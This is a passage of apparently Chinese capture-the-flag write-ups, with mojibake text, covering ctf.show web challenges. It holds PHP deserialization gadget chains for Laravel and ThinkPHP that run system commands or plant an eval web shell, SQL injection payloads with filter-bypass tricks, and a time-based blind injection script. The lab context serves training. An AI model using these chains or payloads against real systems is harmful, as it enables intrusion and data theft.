eval(\$_POST[1]);phpinfo();?&gt;&#39; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web&#x2F;1.php &quot;);    echo(base64_encode(serialize($exp)));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web269-270"><a href="#web269-270" class="headerlink" title="web269-270"></a>web269-270</h4><p>ä¸268ç›¸åŒ</p><h4 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h4><p>laravel 5.7çš„ååºåˆ—åŒ–ï¼Œå…ˆå¤ç°å§ï¼Œç­‰åšåˆ°åé¢çš„å…³å†ç†è§£ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;class PendingCommand&#123;protected $command;protected $parameters;protected $app;public $test;public function __construct($command, $parameters,$class,$app)    &#123;        $this-&gt;command &#x3D; $command;        $this-&gt;parameters &#x3D; $parameters;        $this-&gt;test&#x3D;$class;        $this-&gt;app&#x3D;$app;    &#125;&#125;&#125;namespace Illuminate\Auth&#123;class GenericUser&#123;protected $attributes;public function __construct(array $attributes)&#123;        $this-&gt;attributes &#x3D; $attributes;    &#125;&#125;&#125;namespace Illuminate\Foundation&#123;class Application&#123;protected $hasBeenBootstrapped &#x3D; false;protected $bindings;public function __construct($bind)&#123;$this-&gt;bindings&#x3D;$bind;&#125;&#125;&#125;namespace&#123;echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand(&quot;system&quot;,array(&#39;cat &#x2F;flag&#39;),new Illuminate\Auth\GenericUser(array(&quot;expectedOutput&quot;&#x3D;&gt;array(&quot;0&quot;&#x3D;&gt;&quot;1&quot;),&quot;expectedQuestions&quot;&#x3D;&gt;array(&quot;0&quot;&#x3D;&gt;&quot;1&quot;))),new Illuminate\Foundation\Application(array(&quot;Illuminate\Contracts\Console\Kernel&quot;&#x3D;&gt;array(&quot;concrete&quot;&#x3D;&gt;&quot;Illuminate\Foundation\Application&quot;))))));&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h4><p>Laravel5.8ååºåˆ—åŒ–æ¼æ´,ç»§ç»­ç”¨å¸ˆå‚…ä»¬ç»™çš„é“¾å­ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Broadcasting&#123;     use Illuminate\Bus\Dispatcher;    use Illuminate\Foundation\Console\QueuedCommand;     class PendingBroadcast    &#123;        protected $events;        protected $event;        public function __construct()&#123;            $this-&gt;events&#x3D;new Dispatcher();            $this-&gt;event&#x3D;new QueuedCommand();        &#125;    &#125;&#125;namespace Illuminate\Foundation\Console&#123;     use Mockery\Generator\MockDefinition;     class QueuedCommand    &#123;        public $connection;        public function __construct()&#123;            $this-&gt;connection&#x3D;new MockDefinition();        &#125;    &#125;&#125;namespace Illuminate\Bus&#123;     use Mockery\Loader\EvalLoader;     class Dispatcher    &#123;        protected $queueResolver;        public function __construct()&#123;            $this-&gt;queueResolver&#x3D;[new EvalLoader(),&#39;load&#39;];        &#125;    &#125;&#125;namespace Mockery\Loader&#123;    class EvalLoader    &#123;     &#125;&#125;namespace Mockery\Generator&#123;    class MockDefinition    &#123;        protected $config;        protected $code;        public function __construct()        &#123;            $this-&gt;code&#x3D;&quot;&lt;?php eval(\$_POST[h3]);phpinfo();exit()?&gt;&quot;; &#x2F;&#x2F;æ­¤å¤„æ˜¯PHPä»£ç             $this-&gt;config&#x3D;new MockConfiguration();        &#125;    &#125;    class MockConfiguration    &#123;        protected $name&#x3D;&quot;feng&quot;;    &#125;&#125; namespace&#123;     use Illuminate\Broadcasting\PendingBroadcast;     echo urlencode(serialize(new PendingBroadcast()));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨phpinfoé¡µé¢æ‰¾åˆ°flag</p><h4 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h4><p>è¿›å»å°±æ˜¯Thinkphp v5.1ï¼Œçœ‹æ ·å­å°±æ˜¯thinkphpååºåˆ—åŒ–äº†ï¼Œå³é”®æŸ¥çœ‹æºç ï¼Œæ‰¾åˆ°å…¥å£ï¼Œgetä¼ å‚codeï¼Œä½†è¿˜æ˜¯å·æ‡’ï¼Œæ‰¾äº†ä¸‹yuå¸ˆå‚…å‘çš„é“¾å­ï¼ˆ?lin=cat /f*&amp;data=ï¼‰</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace think;abstract class Model&#123;    protected $append &#x3D; [];    private $data &#x3D; [];    function __construct()&#123;        $this-&gt;append &#x3D; [&quot;lin&quot;&#x3D;&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];        $this-&gt;data &#x3D; [&quot;lin&quot;&#x3D;&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook &#x3D; [];    protected $filter &#x3D; &quot;system&quot;;    protected $config &#x3D; [        &#x2F;&#x2F; è¡¨å•ajaxä¼ªè£…å˜é‡        &#39;var_ajax&#39;         &#x3D;&gt; &#39;_ajax&#39;,      ];    function __construct()&#123;        $this-&gt;filter &#x3D; &quot;system&quot;;        $this-&gt;config &#x3D; [&quot;var_ajax&quot;&#x3D;&gt;&#39;lin&#39;];        $this-&gt;hook &#x3D; [&quot;visible&quot;&#x3D;&gt;[$this,&quot;isAjax&quot;]];    &#125;&#125;namespace think\process\pipes;use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123;    private $files &#x3D; [];    public function __construct()    &#123;        $this-&gt;files&#x3D;[new Pivot()];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo base64_encode(serialize(new Windows()));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h4><p>å‘ç°é­”æ³•å‡½æ•°__destructç”¨systemå‡½æ•°ï¼Œé‚£ä¹ˆåªéœ€è®©$this-&gt;evilfileä¸ºtru,$contentåˆå¯ä»¥ç”¨postä¼ å‚è¿›è¡Œæ§åˆ¶ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">?fn&#x3D;;cat f*post:jian&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="web276-278"><a href="#web276-278" class="headerlink" title="web276-278"></a>web276-278</h4><p>å…ˆè·³è¿‡äº†ï¼Œç­‰ä»¥åå†æ‰¾æ—¶é—´åšå§</p>]]></content>
      
      
      <categories>
          
          <category> ctf_show </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå…¥é—¨_ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF_SHOWä¹‹webå…¥é—¨sqléƒ¨åˆ†wp</title>
      <link href="/2022/03/23/jian-web-sql/"/>
      <url>/2022/03/23/jian-web-sql/</url>
      
        <content type="html"><![CDATA[<h3 id="æ— è¿‡æ»¤æ³¨å…¥"><a href="#æ— è¿‡æ»¤æ³¨å…¥" class="headerlink" title="æ— è¿‡æ»¤æ³¨å…¥"></a>æ— è¿‡æ»¤æ³¨å…¥</h3><h4 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span>$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç›´æ¥é‡‡ç”¨æ‹¼æ¥é—­åˆpayload:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or username='</span>flag'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h4><p>é¦–å…ˆæµ‹è¯•æœ‰å‡ åˆ—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' order by 2--+ï¼›1'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°2ä¸æŠ¥é”™ï¼Œ3æŠ¥é”™ï¼Œè¯´æ˜æœ‰ä¸¤åˆ—<br>ç„¶åæŸ¥è¯¢æ•°æ®åº“åï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_172a.png"></p><p>æ‹¿åˆ°æ•°æ®åº“ååå†ç»§ç»­æŸ¥è¯¢è¡¨åï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select group_concat(table_name),2 from information_schema.tables where table_schema='</span>ctfshow_web'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_172b.png"></p><p>å‘ç°æœ‰ä¸¤ä¸ªè¡¨ï¼Œç„¶ååˆ†åˆ«æŸ¥è¯¢è¡¨çš„åˆ—å</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select group_concat(column_name),2 from information_schema.columns where table_name='</span>ctfshow_user2'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_172c.png"></p><p>ç„¶åå†æŸ¥è¯¢passwordå­—æ®µé‡Œçš„å†…å®¹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> password<span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">from</span> ctfshow_user2<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h4><p>ç»§ç»­ä¸Šé¢˜çš„æ€è·¯ï¼Œå˜æˆäº†3åˆ—</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥æ•°æ®åº“åï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_173a.png"></p><p>æŸ¥è¡¨å</p><p>1â€™ union select group_concat(table_name),2,3 from information_schema.tables where table_schema=â€™ctfshow_webâ€™â€“+</p><p><img src="/images/web_173b.png"></p><p>æŸ¥å­—æ®µå</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select group_concat(column_name),2,3 from information_schema.columns where table_name='</span>ctfshow_user3'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_173c.png"></p><p>æŸ¥è¯¢passwordå­—æ®µé‡Œçš„å†…å®¹ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> password<span class="token punctuation">,</span><span class="token number">2</span> <span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> ctfshow_user3<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h4><p>å…ˆæµ‹è¯•å‡ºæœ‰å‡ ä¸ªå­—æ®µï¼Œå‘ç°åœ¨2çš„æ—¶å€™çš„å›æ˜¾æ­£å¸¸ï¼Œ3çš„æ—¶å€™å¼‚å¸¸ï¼Œè¯´æ˜æœ‰ä¸¤ä¸ªå­—æ®µ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°ä¸¤ä¸ªå­—æ®µéƒ½èƒ½å›æ˜¾</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select '</span>a<span class="token string">','</span>b' <span class="token keyword">from</span> ctfshow_user4<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/web_174a.png"></p><p>ç„¶åå› ä¸ºè¿”å›çš„æ•°æ®ä¸­ä¸èƒ½æœ‰flagå’Œæ•°å­—ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶ä¸­çš„æ•°å­—æ›¿æ¢æ‰</p><p>replace(input_string, substring, new_substring)</p><ul><li><code>input_string</code>æ˜¯è¦æœç´¢çš„ä»»ä½•å­—ç¬¦ä¸²è¡¨è¾¾å¼ã€‚</li><li><code>substring</code>æ˜¯è¦æ›¿æ¢çš„å­å­—ç¬¦ä¸²ã€‚</li><li><code>new_substring</code>æ˜¯æ›¿æ¢å­—ç¬¦ä¸²ã€‚</li></ul><p><code>REPLACE()</code>å‡½æ•°è¿”å›ä¸€ä¸ªæ–°å­—ç¬¦ä¸²ï¼Œå…¶ä¸­å‡ºç°æ‰€æœ‰å­å­—ç¬¦ä¸²è¢«<code>new_substring</code>æ›¿æ¢ã€‚ å¦‚æœä»»ä½•å‚æ•°ä¸º<code>NULL</code>ï¼Œåˆ™è¿”å›<code>NULL</code>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¸€å±‚ä¸€å±‚çš„æ›¿æ¢å³å¯ã€</p><p>å…ˆæœ¬åœ°æ„é€ å‡ºæ›¿æ¢æ•°å­—çš„sqlè¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token number">1234567890</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'numA'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'numB'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'numC'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'numD'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">'numE'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">'numF'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'numG'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'numH'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'numI'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'numJ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå› ä¸ºç›´æ¥çŸ¥é“è¡¨åå’Œå­—æ®µåæ‰€ä»¥ç›´æ¥æ„é€ å‡ºpayloadï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' union select '</span>a<span class="token string">',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,'</span>numA<span class="token string">'),2,'</span>numB<span class="token string">'),3,'</span>numC<span class="token string">'),4,'</span>numD<span class="token string">'),5,'</span>numE<span class="token string">'),6,'</span>numF<span class="token string">'),7,'</span>numG<span class="token string">'),8,'</span>numH<span class="token string">'),9,'</span>numI<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>numJ'<span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_user4<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°çš„flagçš„å†…å®¹ä¸º;</p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;numDdbnumInumDnumAnumGnumG-numInumBnumEc-numDnumBnumCe-aanumJnumJ-numHnumGnumFdnumFfnumFnumFnumInumGanumE&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å†å†™ä¸ªpyè„šæœ¬æ›¿æ¢å›å»ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflag1 <span class="token operator">=</span> <span class="token string">"ctfshow&#123;numDdbnumInumDnumAnumGnumG-numInumBnumEc-numDnumBnumCe-aanumJnumJ-numHnumGnumFdnumFfnumFnumFnumInumGanumE&#125;"</span>flag <span class="token operator">=</span> <span class="token string">" "</span>flag <span class="token operator">=</span> flag1<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numA'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numB'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numC'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numD'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numE'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numF'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numG'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numH'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numI'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'numJ'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//æ£€æŸ¥ç»“æœæ˜¯å¦æœ‰flag</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00-\x7f]/i'</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'æŸ¥è¯¢æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸€æ¬¡å°†æ‰€æœ‰çš„å­—ç¬¦æ•°å­—éƒ½è¿‡æ»¤äº†ï¼Œæ‰€æœ‰è€ƒè™‘é‡‡ç”¨ç›²æ³¨çš„æ–¹æ³•ã€‚<br>substr(str,pos,len): ä»poså¼€å§‹çš„ä½ç½®ï¼Œæˆªå–lenä¸ªå­—ç¬¦</p><p>pythonè„šæœ¬ä¸ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://86e4b4c8-3a29-44f1-a519-e467033706e2.challenge.ctf.show/api/v5.php"</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnm-&#123;&#125;"</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"?id=1' and if(substr((select password from ctfshow_user5 where username = \"flag\"),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)=\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">\",sleep(3),0)--+"</span></span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span>        <span class="token comment">#print(res.status_code)</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end<span class="token operator">-</span>start <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h3 id="è¿‡æ»¤æ³¨å…¥"><a href="#è¿‡æ»¤æ³¨å…¥" class="headerlink" title="è¿‡æ»¤æ³¨å…¥"></a>è¿‡æ»¤æ³¨å…¥</h3><h4 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h4><p>è¿›å…¥äº†è¿‡æ»¤é¢˜äº†ï¼Œå…ˆæŸ¥çœ‹æœ‰å‡ ä¸ªå­—æ®µ</p><pre class="line-numbers language-none"><code class="language-none">1%27%20order%20by%203--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°åœ¨3æ—¶æœ‰æ•°æ®ï¼Œ4æ²¡æœ‰æ•°æ®ï¼Œè¯´æ˜æœ‰3ä¸ªå­—æ®µ</p><p><img src="/images/web_176a.png"></p><p><img src="/images/web_176b.png"></p><p>å†ç»§ç»­è¾“å…¥payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">1%27%20union%20select%20id%20,username,password%20from%20ctfshow_user--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°æ²¡æœ‰æ•°æ®è¿”å›ï¼Œå°†selectæ”¹ä¸ºSelectåï¼ŒæˆåŠŸè¿”å›æ•°æ®ï¼Œè¯´æ˜å¯¹selectä¹Ÿè¿›è¡Œäº†è¿‡æ»¤ï¼Œä½†å¹¶æ²¡å¤§å°å†™è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥ç»•è¿‡ï¼Œæ‹¿åˆ°flag</p><h4 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h4><p>è¿™æ¬¡å‘ç°æ˜¯å¯¹ç©ºæ ¼çš„è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥ç”¨/**/è¿›è¡Œç»•è¿‡ï¼Œpayload</p><pre class="line-numbers language-none"><code class="language-none">1&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;&#39;a&#39;,&#39;b&#39;,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ç›´æ¥ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">1&#39;or(1&#x3D;1)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h4><p>æœ¬é¢˜åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šå°†/**/ä¹Ÿè¿‡æ»¤äº†ï¼Œä½†æˆ‘ä»¬å¯ä»¥é‡‡ç”¨%09ï¼ˆæ°´å¹³åˆ¶è¡¨ç¬¦ï¼‰è¿›è¡Œç»•è¿‡ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">1&#39;%09union%09select%09password,&#39;a&#39;,&#39;b&#39;%09from%09ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><p>ä¹Ÿå¯ä»¥ç»§ç»­ç”¨ä¸‡èƒ½å¯†ç </p><pre class="line-numbers language-none"><code class="language-none">1&#39;%09or%091&#x3D;1%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h4><p>æœ¬é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šåˆå°†%09è¿‡æ»¤äº†ï¼Œç»§ç»­å°è¯•å…¶ä»–çš„æ§åˆ¶å­—ç¬¦ï¼Œå‘ç°%0cå¯ä»¥ç»•è¿‡ï¼Œpayloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">1&#39;%0cunion%0cselect%0cpassword,&#39;a&#39;,&#39;b&#39;%0cfrom%0cctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°flag</p><h4 id="web180"><a href="#web180" class="headerlink" 